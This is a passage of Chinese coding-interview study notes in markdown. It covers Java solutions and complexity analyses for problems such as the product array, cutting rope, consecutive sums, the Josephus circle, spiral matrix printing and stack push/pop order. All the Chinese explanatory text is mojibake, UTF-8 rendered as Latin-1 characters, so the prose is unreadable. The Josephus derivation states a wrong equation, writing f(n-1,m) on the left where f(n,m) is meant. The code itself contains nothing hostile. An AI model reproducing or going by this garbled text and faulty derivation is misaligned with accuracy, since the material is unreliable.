0, votes = 0;\n        for(int num : nums){\n            if(votes == 0) x = num;\n            votes += num == x ? 1 : -1;\n        }\n        return x;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºæ•°ç»„ nums çš„é•¿åº¦ï¼›éå†æ•°ç»„å ç”¨ O(N) \n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š**  HashMap ä½¿ç”¨ O(N) é¢å¤–ç©ºé—´\n\n#### æ–¹æ³•2\n\n**æ—¶é—´å¤æ‚åº¦ O(nlogn) **\n\n### æ–¹æ³•3\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** N ä¸ºæ•°ç»„ `nums` é•¿åº¦ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** `votes` å˜é‡ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 66. æ„å»ºä¹˜ç§¯æ•°ç»„\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ªæ•°ç»„ A[0,1,â€¦,n-1]ï¼Œè¯·æ„å»ºä¸€ä¸ªæ•°ç»„ B[0,1,â€¦,n-1]ï¼Œå…¶ä¸­ B[i] çš„å€¼æ˜¯æ•°ç»„ A ä¸­é™¤äº†ä¸‹æ ‡ i ä»¥å¤–çš„å…ƒç´ çš„ç§¯, å³ B[i]=A[0]Ã—A[1]Ã—â€¦Ã—A[i-1]Ã—A[i+1]Ã—â€¦Ã—A[n-1]ã€‚ä¸èƒ½ä½¿ç”¨é™¤æ³•ã€‚\n>\n>ç¤ºä¾‹:\n>\n>```\n>è¾“å…¥: [1,2,3,4,5]\n>è¾“å‡º: [120,60,40,30,24]\n>```\n\n### è§£ç­”\n\næ ¹æ®è¡¨æ ¼çš„ä¸»å¯¹è§’çº¿ï¼ˆå…¨ä¸º 1 ï¼‰ï¼Œå¯å°†è¡¨æ ¼åˆ†ä¸º **ä¸Šä¸‰è§’** å’Œ **ä¸‹ä¸‰è§’** ä¸¤éƒ¨åˆ†ã€‚åˆ†åˆ«è¿­ä»£è®¡ç®—ä¸‹ä¸‰è§’å’Œä¸Šä¸‰è§’ä¸¤éƒ¨åˆ†çš„ä¹˜ç§¯ï¼Œå³å¯ **ä¸ä½¿ç”¨é™¤æ³•** å°±è·å¾—ç»“æœã€‚\n\n![](https://img.jwt1399.top/img/202209041308244.png)\n\n```java\nclass Solution {\n    public int[] constructArr(int[] a) {\n        int len = a.length;\n        if(len == 0) return new int[0];\n        int[] b = new int[len];\n        b[0] = 1;\n        int tmp = 1;\n        for(int i = 1; i < len; i++) {//è®¡ç®—ä¸‹ä¸‰è§’\n            b[i] = b[i - 1] * a[i - 1];\n        }\n        for(int i = len - 2; i >= 0; i--) {//è®¡ç®—ä¸Šä¸‰è§’\n            tmp *= a[i + 1];\n            b[i] *= tmp;\n        }\n        return b;\n    }\n}\n\n\nclass Solution {\n    public int[] constructArr(int[] a) {\nint n = a.length;\n    int[] B = new int[n];\n    for (int i = 0, product = 1; i < n; product *= a[i], i++)       /* ä»å·¦å¾€å³ç´¯ä¹˜ */\n        B[i] = product;\n    for (int i = n - 1, product = 1; i >= 0; product *= a[i], i--)  /* ä»å³å¾€å·¦ç´¯ä¹˜ */\n        B[i] *= product;\n    return B;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** å…¶ä¸­ N ä¸ºæ•°ç»„é•¿åº¦ï¼Œä¸¤è½®éå†æ•°ç»„ a ï¼Œä½¿ç”¨ O(N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1)ï¼š** å˜é‡ tmp ä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ï¼ˆæ•°ç»„ b ä½œä¸ºè¿”å›å€¼ï¼Œä¸è®¡å…¥å¤æ‚åº¦è€ƒè™‘ï¼‰ã€‚\n\n# ç¬¬ 24 å¤© æ•°å­¦ï¼ˆä¸­ç­‰ï¼‰\n\n## 14- I. å‰ªç»³å­\n\n### é¢˜ç›®\n\n>ç»™ä½ ä¸€æ ¹é•¿åº¦ä¸º n çš„ç»³å­ï¼Œè¯·æŠŠç»³å­å‰ªæˆæ•´æ•°é•¿åº¦çš„ m æ®µï¼ˆmã€néƒ½æ˜¯æ•´æ•°ï¼Œn>1å¹¶ä¸”m>1ï¼‰ï¼Œæ¯æ®µç»³å­çš„é•¿åº¦è®°ä¸º k[0],k[1]...k[m-1]ã€‚è¯·é—® k[0]\\*k[1]\\*...\\*k[m-1] å¯èƒ½çš„æœ€å¤§ä¹˜ç§¯æ˜¯å¤šå°‘ï¼Ÿä¾‹å¦‚ï¼Œå½“ç»³å­çš„é•¿åº¦æ˜¯8æ—¶ï¼Œæˆ‘ä»¬æŠŠå®ƒå‰ªæˆé•¿åº¦åˆ†åˆ«ä¸º2ã€3ã€3çš„ä¸‰æ®µï¼Œæ­¤æ—¶å¾—åˆ°çš„æœ€å¤§ä¹˜ç§¯æ˜¯18ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥: 2\n>è¾“å‡º: 1\n>è§£é‡Š: 2 = 1 + 1, 1 Ã— 1 = 1\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: 10\n>è¾“å‡º: 36\n>è§£é‡Š: 10 = 3 + 3 + 4, 3 Ã— 3 Ã— 4 = 36\n>```\n\n### è§£ç­”\n\n**æ•°å­¦æ¨å¯¼ï¼š**\n\n- â‘  å½“æ‰€æœ‰ç»³æ®µé•¿åº¦ç›¸ç­‰æ—¶ï¼Œä¹˜ç§¯æœ€å¤§ã€‚\n\n- â‘¡ æœ€ä¼˜çš„ç»³æ®µé•¿åº¦ä¸º 3 ã€‚\n\n##### åˆ‡åˆ†è§„åˆ™ï¼š\n\n1.  **æœ€ä¼˜ï¼š** 3 ã€‚æŠŠç»³å­å°½å¯èƒ½åˆ‡ä¸ºå¤šä¸ªé•¿åº¦ä¸º 3 çš„ç‰‡æ®µï¼Œç•™ä¸‹çš„æœ€åä¸€æ®µç»³å­çš„é•¿åº¦å¯èƒ½ä¸º 0,1,2 ä¸‰ç§æƒ…å†µã€‚\n2.  **æ¬¡ä¼˜ï¼š** 2 ã€‚è‹¥æœ€åä¸€æ®µç»³å­é•¿åº¦ä¸º 2 ï¼›åˆ™ä¿ç•™ï¼Œä¸å†æ‹†ä¸º 1+1 ã€‚\n3.  **æœ€å·®ï¼š** 1 ã€‚è‹¥æœ€åä¸€æ®µç»³å­é•¿åº¦ä¸º 1 ï¼›åˆ™åº”æŠŠä¸€ä»½ 3+1 æ›¿æ¢ä¸º 2+2ï¼Œå› ä¸º 2Ã—2\\>3Ã—1\n\n![](https://img.jwt1399.top/img/202209051336775.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  å½“ n â‰¤ 3 æ—¶ï¼ŒæŒ‰ç…§è§„åˆ™åº”ä¸åˆ‡åˆ†ï¼Œä½†ç”±äºé¢˜ç›®è¦æ±‚å¿…é¡»å‰ªæˆ m\\>1 æ®µï¼Œå› æ­¤å¿…é¡»å‰ªå‡ºä¸€æ®µé•¿åº¦ä¸º 1 çš„ç»³å­ï¼Œå³è¿”å› nâˆ’1 ã€‚\n2.  å½“ n > 3 æ—¶ï¼Œæ±‚ n é™¤ä»¥ 3 çš„ æ•´æ•°éƒ¨åˆ† a å’Œ ä½™æ•°éƒ¨åˆ† b ï¼ˆå³ n\\=3a+bï¼‰ï¼Œå¹¶åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š\n    -   å½“ b = 0 æ—¶ï¼Œç›´æ¥è¿”å› 3<sup>a</sup>ï¼›\n    -   å½“ b = 1 æ—¶ï¼Œè¦å°†ä¸€ä¸ª 1+3 è½¬æ¢ä¸º 2+2ï¼Œå› æ­¤è¿”å› 3<sup>a-1</sup>Ã—4ï¼›\n    -   å½“ b\\=2 æ—¶ï¼Œè¿”å› 3<sup>a</sup>Ã—2ã€‚\n\n```java\nclass Solution {\n    public int cuttingRope(int n) {\n      if(n <= 3) return n - 1;\n      int a = n / 3;\n      int b = n % 3;\n      if(b == 0) return (int)Math.pow(3,a);\n      if(b == 1) return (int)Math.pow(3,a-1)*4;\n      return (int)Math.pow(3,a) * 2;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(1) ï¼š** ä»…æœ‰æ±‚æ•´ã€æ±‚ä½™ã€æ¬¡æ–¹è¿ç®—ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å˜é‡ `a` å’Œ `b` ä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 57 - II. å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•° target ï¼Œè¾“å‡ºæ‰€æœ‰å’Œä¸º target çš„è¿ç»­æ­£æ•´æ•°åºåˆ—ï¼ˆè‡³å°‘å«æœ‰ä¸¤ä¸ªæ•°ï¼‰ã€‚\n>\n>åºåˆ—å†…çš„æ•°å­—ç”±å°åˆ°å¤§æ’åˆ—ï¼Œä¸åŒåºåˆ—æŒ‰ç…§é¦–ä¸ªæ•°å­—ä»å°åˆ°å¤§æ’åˆ—ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼štarget = 9\n>è¾“å‡ºï¼š[[2,3,4],[4,5]]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼štarget = 15\n>è¾“å‡ºï¼š[[1,2,3,4,5],[4,5,6],[7,8]]\n>```\n\n### è§£ç­”\n\nè®¾è¿ç»­æ­£æ•´æ•°åºåˆ—çš„**å·¦è¾¹ç•Œ i** å’Œ**å³è¾¹ç•Œ j** ï¼Œåˆ™å¯æ„å»ºæ»‘åŠ¨çª—å£ä»å·¦å‘å³æ»‘åŠ¨ã€‚å¾ªç¯ä¸­ï¼Œæ¯è½®åˆ¤æ–­æ»‘åŠ¨çª—å£å†…å…ƒç´ å’Œä¸ç›®æ ‡å€¼ target çš„å¤§å°å…³ç³»ï¼Œè‹¥ç›¸ç­‰åˆ™è®°å½•ç»“æœï¼Œè‹¥å¤§äº target åˆ™ç§»åŠ¨å·¦è¾¹ç•Œ i ï¼ˆä»¥å‡å°çª—å£å†…çš„å…ƒç´ å’Œï¼‰ï¼Œè‹¥å°äº target åˆ™ç§»åŠ¨å³è¾¹ç•Œ j ï¼ˆä»¥å¢å¤§çª—å£å†…çš„å…ƒç´ å’Œï¼‰ã€‚\n\n![](https://img.jwt1399.top/img/202209051406993.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** å·¦è¾¹ç•Œ i\\=1ï¼Œå³è¾¹ç•Œ j\\=2ï¼Œå…ƒç´ å’Œ s\\=3 ï¼Œç»“æœåˆ—è¡¨ res ï¼›\n\n2.  **å¾ªç¯ï¼š** å½“ i â‰¥ j æ—¶è·³å‡ºï¼›\n    -   å½“ s > target æ—¶ï¼š æ›´æ–°å…ƒç´ å’Œ sï¼Œå¹¶å‘å³ç§»åŠ¨å·¦è¾¹ç•Œ i\\=i+1 ï¼›\n    -   å½“ s < target æ—¶ï¼š å‘å³ç§»åŠ¨å³è¾¹ç•Œ j\\=j+1 ï¼Œå¹¶æ›´æ–°å…ƒç´ å’Œ s ï¼›\n    -   å½“ s = target æ—¶ï¼š è®°å½•è¿ç»­æ•´æ•°åºåˆ—ï¼Œå¹¶å‘å³ç§»åŠ¨å·¦è¾¹ç•Œ i\\=i+1ï¼Œæ›´æ–°å…ƒç´ å’Œ s ï¼›\n3.  **è¿”å›å€¼ï¼š** è¿”å›ç»“æœåˆ—è¡¨ res ï¼›\n\n```java\nclass Solution {\n    public int[][] findContinuousSequence(int target) {\n      int i = 1, j = 2, s = 3;\n      List<int[]> res = new ArrayList<>();\n      while(i < j){\n        if(s > target) {\n          s -= i;\n          i++;\n        }\n        else if(s < target){\n            j++;\n            s += j;\n        } \n        else{\n            int[] ans = new int[j-i+1];\n        \tfor(int k = i; k <= j; k++)\n          \t    ans[k - i] = k;\n            res.add(ans);\n            s -= i;  \n            i++;\n            \n        }\n      }\n      return res.toArray(new int[0][]);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N\\=targetï¼›è¿ç»­æ•´æ•°åºåˆ—è‡³å°‘æœ‰ä¸¤ä¸ªæ•°å­—ï¼Œè€Œ i<jæ’æˆç«‹ï¼Œå› æ­¤è‡³å¤šå¾ªç¯ target æ¬¡ï¼›\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å˜é‡ i , j , s ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 62.åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—\n\n### é¢˜ç›®\n\n>0,1,Â·Â·Â·,n-1è¿™nä¸ªæ•°å­—æ’æˆä¸€ä¸ªåœ†åœˆï¼Œä»æ•°å­—0å¼€å§‹ï¼Œæ¯æ¬¡ä»è¿™ä¸ªåœ†åœˆé‡Œåˆ é™¤ç¬¬mä¸ªæ•°å­—ï¼ˆåˆ é™¤åä»ä¸‹ä¸€ä¸ªæ•°å­—å¼€å§‹è®¡æ•°ï¼‰ã€‚æ±‚å‡ºè¿™ä¸ªåœ†åœˆé‡Œå‰©ä¸‹çš„æœ€åä¸€ä¸ªæ•°å­—ã€‚\n>\n>ä¾‹å¦‚ï¼Œ0ã€1ã€2ã€3ã€4è¿™5ä¸ªæ•°å­—ç»„æˆä¸€ä¸ªåœ†åœˆï¼Œä»æ•°å­—0å¼€å§‹æ¯æ¬¡åˆ é™¤ç¬¬3ä¸ªæ•°å­—ï¼Œåˆ™åˆ é™¤çš„å‰4ä¸ªæ•°å­—ä¾æ¬¡æ˜¯2ã€0ã€4ã€1ï¼Œå› æ­¤æœ€åå‰©ä¸‹çš„æ•°å­—æ˜¯3ã€‚\n>\n> \n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥: n = 5, m = 3\n>è¾“å‡º: 3\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥: n = 10, m = 17\n>è¾“å‡º: 2\n>```\n\n### è§£ç­”\n\nè¿™ä¸ªé—®é¢˜æ˜¯ä»¥å¼—æ‹‰ç»´å¥¥Â·çº¦ç‘Ÿå¤«å‘½åçš„ï¼Œç§°ä¸ºâ€œ**çº¦ç‘Ÿå¤«ç¯**â€é—®é¢˜ï¼Œå¯ä½¿ç”¨ **åŠ¨æ€è§„åˆ’** è§£å†³ã€‚\n\n**æœ€å®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•æ˜¯ï¼š**æ„å»ºä¸€ä¸ªé•¿åº¦ä¸º n çš„é“¾è¡¨ï¼Œå„èŠ‚ç‚¹å€¼ä¸ºå¯¹åº”çš„é¡ºåºç´¢å¼•ï¼›æ¯è½®åˆ é™¤ç¬¬ m ä¸ªèŠ‚ç‚¹ï¼Œç›´è‡³é“¾è¡¨é•¿åº¦ä¸º 1 æ—¶ç»“æŸï¼Œè¿”å›æœ€åå‰©ä½™èŠ‚ç‚¹çš„å€¼å³å¯ã€‚æ¨¡æ‹Ÿæ³•éœ€è¦å¾ªç¯åˆ é™¤ nâˆ’1 è½®ï¼Œæ¯è½®åœ¨é“¾è¡¨ä¸­å¯»æ‰¾åˆ é™¤èŠ‚ç‚¹éœ€è¦ m æ¬¡è®¿é—®æ“ä½œï¼ˆé“¾è¡¨çº¿æ€§éå†ï¼‰ï¼Œå› æ­¤æ€»ä½“æ—¶é—´å¤æ‚åº¦ä¸º O(nm) ã€‚æ ¹æ®é¢˜ç›®ç»™å®šçš„ m,n å–å€¼èŒƒå›´ï¼Œå¯çŸ¥æ­¤æ—¶é—´å¤æ‚åº¦æ˜¯ä¸å¯æ¥å—çš„ã€‚\n\n**åŠ¨æ€è§„åˆ’è§£æ³•**\n\nè®¾ `f(n,m)` è¡¨ç¤ºåœ¨ n ä¸ªæ•°å­—(0ï½n-1)ä¸­ä¸æ–­åˆ é™¤ç¬¬ m ä¸ªæ•°å­—æœ€åå‰©ä¸‹çš„æ•°å­—ã€‚åˆ é™¤ä¸€ä¸ªæ•°å­—åå‰©ä¸‹äº† n-1 ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆå†æ¬¡åˆ é™¤å°±æ˜¯åœ¨ n-1 ä¸ªæ•°å­—ä¸­åˆ é™¤ç¬¬ m ä¸ªæ•°å­—ï¼Œå¯ä»¥è¡¨ç¤ºä¸º `f(n-1,m)`ã€‚\n\nä½†å®é™…ä¸Šç›´æ¥è¿™ä¹ˆè¡¨ç¤ºæ˜¯ä¸å¯¹çš„ã€‚å› ä¸º`f(n,m)`è¡¨ç¤ºçš„æ˜¯ä»åŒºé—´`[0~n-1]`ä¸æ–­è¿›è¡Œåˆ é™¤æ“ä½œï¼Œè¢«åˆ é™¤çš„å…ƒç´ æ˜¯`k=(m-1)%n`ï¼Œè€Œä¸‹ä¸€æ¬¡åˆ é™¤æ—¶ï¼Œèµ·ç‚¹æ˜¯ `k+1ï¼ˆå³m%nï¼‰ `ï¼ŒåŒºé—´ä¸å†æ»¡è¶³ä¸Šè¿°è¦æ±‚ï¼Œå› æ­¤ä»ç¬¬äºŒæ­¥ä¸æ–­åˆ é™¤çš„ç»“æœå¯ä»¥è¡¨ç¤ºä¸º`f'(n-1,m)`ã€‚åˆ™æœ‰ï¼š`f(n,m) = f'(n-1,m)`\n\nç°åœ¨å°±è¦æƒ³åŠæ³•æ‰¾åˆ° `f'(n-1,m)`å’Œ`f(n- 1, m)`ä¹‹é—´çš„å…³ç³»ã€‚åˆ™äºŒè€…æ“ä½œçš„åŒºé—´è¡¨ç¤ºå¦‚ä¸‹:\n\n```\nf'(n-1,m)è¡¨ç¤ºåºåˆ—: k+1 k+2 k+3 ... n-1     0     1  ... k-1\nf(n-1,m) è¡¨ç¤ºåºåˆ—:  0   1   2  ... n-k-2 n-k-1  n-k ... n-2\n```\n\nç”±æ­¤æ¨å‡º `f'(n-1,m)=(f(n-1,m)+k+1)%n`\n\nåŒ–ç®€ï¼š\n\n```\nå› ä¸º\nf'(n-1,m)=(f(n-1,m)+k+1)%n\nk+1= m%n\nf(n,m) = f'(n-1,m)\næ‰€ä»¥\nf(n-1,m)=[f(n-1,m)+m]%n\n```\n\nç”±æ­¤å¯çŸ¥ f(n,m) å¯ç”± f(n-1,m) å¾—åˆ°ï¼Œf(n-1,m) å¯ç”± f(n-2,m) å¾—åˆ°ï¼Œâ€¦â€¦ï¼Œf(2,m) å¯ç”± f(1,m) å¾—åˆ°ï¼›å› æ­¤ï¼Œè‹¥ç»™å®š f(1,m) çš„å€¼ï¼Œå°±å¯ä»¥é€’æ¨è‡³ä»»æ„ f(n,m) ã€‚è€Œ f(1,m) = 0 æ’æˆç«‹ã€‚å¾—åˆ°å¦‚ä¸‹é€’å½’å…³ç³»ï¼š\n\n![](https://img.jwt1399.top/img/202209111343271.png)\n\n##### åŠ¨æ€è§„åˆ’è§£æï¼š\n\n1.  **çŠ¶æ€å®šä¹‰ï¼š** è®¾ã€Œi,mé—®é¢˜ã€çš„è§£ä¸º dp\\[i\\]ï¼›\n2.  **è½¬ç§»æ–¹ç¨‹ï¼š** é€šè¿‡ä»¥ä¸‹å…¬å¼å¯ä» dp\\[iâˆ’1] é€’æ¨å¾—åˆ° dp\\[i\\] \\= (dp\\[iâˆ’1] + m) % iï¼›\n\n3.  **åˆå§‹çŠ¶æ€ï¼š**ã€Œ1,m é—®é¢˜ã€çš„è§£æ’ä¸º 0 ï¼Œå³ dp\\[1\\] = 0ï¼›\n4.  **è¿”å›å€¼ï¼š** è¿”å›ã€Œn,m é—®é¢˜ã€çš„è§£ dp\\[n\\] ï¼›\n\n```java\nclass Solution {\n    public int lastRemaining(int n, int m) {\n      int dp[] = new int[n+1]; \n      dp[1] = 0;\n      for(int i = 2; i <= n; i++){\n        dp[i] = (dp[i-1] + m) % i;\n      }\n      return dp[n];\n    }\n}\n\n//ä¼˜åŒ–\n//æ ¹æ®çŠ¶æ€è½¬ç§»æ–¹ç¨‹çš„é€’æ¨ç‰¹æ€§ï¼Œæ— éœ€å»ºç«‹çŠ¶æ€åˆ—è¡¨ dp ï¼Œè€Œä½¿ç”¨ä¸€ä¸ªå˜é‡ x æ‰§è¡ŒçŠ¶æ€è½¬ç§»å³å¯ã€‚\nclass Solution {\n    public int lastRemaining(int n, int m) {\n        int x = 0;\n        for (int i = 2; i <= n; i++) {\n            x = (x + m) % i;\n        }\n        return x;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(n)ï¼š** çŠ¶æ€è½¬ç§»å¾ªç¯ nâˆ’1æ¬¡ä½¿ç”¨ O(n)æ—¶é—´ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹è®¡ç®—ä½¿ç”¨ O(1) æ—¶é—´ï¼›\n-   **ç©ºé—´å¤æ‚åº¦ O(1)ï¼š** ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ï¼›\n\n# ç¬¬ 25 å¤© æ¨¡æ‹Ÿï¼ˆä¸­ç­‰ï¼‰\n\n## 29. é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªçŸ©é˜µï¼ŒæŒ‰ç…§ä»å¤–å‘é‡Œä»¥é¡ºæ—¶é’ˆçš„é¡ºåºä¾æ¬¡æ‰“å°å‡ºæ¯ä¸€ä¸ªæ•°å­—ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šmatrix = [[1,2,3],[4,5,6],[7,8,9]]\n>è¾“å‡ºï¼š[1,2,3,6,9,8,7,4,5]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šmatrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]\n>è¾“å‡ºï¼š[1,2,3,4,8,12,11,10,9,5,6,7]\n>```\n\n### è§£ç­”\n\né¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µçš„é¡ºåºæ˜¯ **â€œä»å·¦å‘å³ã€ä»ä¸Šå‘ä¸‹ã€ä»å³å‘å·¦ã€ä»ä¸‹å‘ä¸Šâ€** å¾ªç¯ã€‚\n\n**ç®—æ³•æµç¨‹ï¼š**\n\n1.  **ç©ºå€¼å¤„ç†ï¼š** å½“ `matrix` ä¸ºç©ºæ—¶ï¼Œç›´æ¥è¿”å›ç©ºåˆ—è¡¨ `[]` å³å¯ã€‚\n2.  **åˆå§‹åŒ–ï¼š** çŸ©é˜µ å·¦ã€å³ã€ä¸Šã€ä¸‹ å››ä¸ªè¾¹ç•Œ `left` , `right` , `top` , `bottom` ï¼Œç”¨äºæ‰“å°çš„ç»“æœåˆ—è¡¨ `res` ã€‚\n3.  **å¾ªç¯æ‰“å°ï¼š** â€œä»å·¦å‘å³ã€ä»ä¸Šå‘ä¸‹ã€ä»å³å‘å·¦ã€ä»ä¸‹å‘ä¸Šâ€ å››ä¸ªæ–¹å‘å¾ªç¯ï¼Œæ¯ä¸ªæ–¹å‘æ‰“å°ä¸­åšä»¥ä¸‹ä¸‰ä»¶äº‹ _ï¼ˆå„æ–¹å‘çš„å…·ä½“ä¿¡æ¯è§ä¸‹è¡¨ï¼‰_ ï¼›\n    1.  æ ¹æ®è¾¹ç•Œæ‰“å°ï¼Œå³å°†å…ƒç´ æŒ‰é¡ºåºæ·»åŠ è‡³åˆ—è¡¨ `res` å°¾éƒ¨ï¼›\n    2.  è¾¹ç•Œå‘å†…æ”¶ç¼© 1 ï¼ˆä»£è¡¨å·²è¢«æ‰“å°ï¼‰ï¼›\n    3.  åˆ¤æ–­æ˜¯å¦æ‰“å°å®Œæ¯•ï¼ˆè¾¹ç•Œæ˜¯å¦ç›¸é‡ï¼‰ï¼Œè‹¥æ‰“å°å®Œæ¯•åˆ™è·³å‡ºã€‚\n4.  **è¿”å›å€¼ï¼š** è¿”å› `res` å³å¯ã€‚\n\n| æ‰“å°æ–¹å‘ | 1\\. æ ¹æ®è¾¹ç•Œæ‰“å°              | 2\\. è¾¹ç•Œå‘å†…æ”¶ç¼©     | 3\\. æ˜¯å¦æ‰“å°å®Œæ¯•    |\n| -------- | ----------------------------- | -------------------- | ------------------- |\n| ä»å·¦å‘å³ | å·¦è¾¹ç•Œ`left` ï¼Œå³è¾¹ç•Œ `right` | ä¸Šè¾¹ç•Œ `top` åŠ  1    | æ˜¯å¦ `top > bottom` |\n| ä»ä¸Šå‘ä¸‹ | ä¸Šè¾¹ç•Œ `top` ï¼Œä¸‹è¾¹ç•Œ`bottom` | å³è¾¹ç•Œ `right` å‡ 1  | æ˜¯å¦ `left > right` |\n| ä»å³å‘å·¦ | å³è¾¹ç•Œ `right` ï¼Œå·¦è¾¹ç•Œ`left` | ä¸‹è¾¹ç•Œ `bottom` å‡ 1 | æ˜¯å¦ `top > bottom` |\n| ä»ä¸‹å‘ä¸Š | ä¸‹è¾¹ç•Œ `bottom` ï¼Œä¸Šè¾¹ç•Œ`top` | å·¦è¾¹ç•Œ `left` åŠ  1   | æ˜¯å¦ `left > right` |\n\n```java\nclass Solution {\n    public int[] spiralOrder(int[][] matrix) {\n        if(matrix.length == 0) return new int[0];\n        int left = 0, right = matrix[0].length -1, top = 0, bottom = matrix.length -1, count = 0;\n        int[] res = new int[(right + 1)*(bottom + 1)];\n        while(true){\n            for(int i = left; i <= right; i++){ // ä»å·¦åˆ°å³\n                res[count++] = matrix[top][i];\n            }\n            if(++top > bottom) break;\n            for(int i = top; i <= bottom; i++){ // ä»ä¸Šåˆ°ä¸‹\n                res[count++] = matrix[i][right];\n            }\n            if(left > --right) break;\n            for(int i = right; i >= left; i--){ // ä»å³åˆ°å·¦\n                res[count++] = matrix[bottom][i];\n            }\n            if(top > --bottom) break;\n            for(int i = bottom; i >= top; i--){ // ä»ä¸‹åˆ°ä¸Š\n                res[count++] = matrix[i][left];\n            }\n            if(++left > right) break;\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(MN)ï¼š** M,N åˆ†åˆ«ä¸ºçŸ©é˜µè¡Œæ•°å’Œåˆ—æ•°ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å››ä¸ªè¾¹ç•Œä½¿ç”¨å¸¸æ•°å¤§å°çš„ **é¢å¤–** ç©ºé—´ï¼ˆ `res` ä¸ºå¿…é¡»ä½¿ç”¨çš„ç©ºé—´ï¼‰ã€‚\n\n## 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸¤ä¸ªæ•´æ•°åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—è¡¨ç¤ºæ ˆçš„å‹å…¥é¡ºåºï¼Œè¯·åˆ¤æ–­ç¬¬äºŒä¸ªåºåˆ—æ˜¯å¦ä¸ºè¯¥æ ˆçš„å¼¹å‡ºé¡ºåºã€‚å‡è®¾å‹å…¥æ ˆçš„æ‰€æœ‰æ•°å­—å‡ä¸ç›¸ç­‰ã€‚ä¾‹å¦‚ï¼Œåºåˆ— {1,2,3,4,5} æ˜¯æŸæ ˆçš„å‹æ ˆåºåˆ—ï¼Œåºåˆ— {4,5,3,2,1} æ˜¯è¯¥å‹æ ˆåºåˆ—å¯¹åº”çš„ä¸€ä¸ªå¼¹å‡ºåºåˆ—ï¼Œä½† {4,3,5,1,2} å°±ä¸å¯èƒ½æ˜¯è¯¥å‹æ ˆåºåˆ—çš„å¼¹å‡ºåºåˆ—ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼špushed = [1,2,3,4,5], popped = [4,5,3,2,1]\n>è¾“å‡ºï¼štrue\n>è§£é‡Šï¼šæˆ‘ä»¬å¯ä»¥æŒ‰ä»¥ä¸‹é¡ºåºæ‰§è¡Œï¼š\n>push(1), push(2), push(3), push(4), pop() -> 4,\n>push(5), pop() -> 5, pop() -> 3, pop() -> 2, pop() -> 1\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼špushed = [1,2,3,4,5], popped = [4,3,5,1,2]\n>è¾“å‡ºï¼šfalse\n>è§£é‡Šï¼š1 ä¸èƒ½åœ¨ 2 ä¹‹å‰å¼¹å‡ºã€‚\n>```\n\n### è§£ç­”\n\nè€ƒè™‘å€Ÿç”¨ä¸€ä¸ªè¾…åŠ©æ ˆ stack ï¼Œ**æ¨¡æ‹Ÿ** å‹å…¥ / å¼¹å‡ºæ“ä½œçš„æ’åˆ—ã€‚æ ¹æ®æ˜¯å¦æ¨¡æ‹ŸæˆåŠŸï¼Œå³å¯å¾—åˆ°ç»“æœã€‚\n\n-   **å…¥æ ˆæ“ä½œï¼š** æŒ‰ç…§å‹æ ˆåºåˆ—çš„é¡ºåºæ‰§è¡Œã€‚\n-   **å‡ºæ ˆæ“ä½œï¼š** æ¯æ¬¡å…¥æ ˆåï¼Œå¾ªç¯åˆ¤æ–­ â€œ**æ 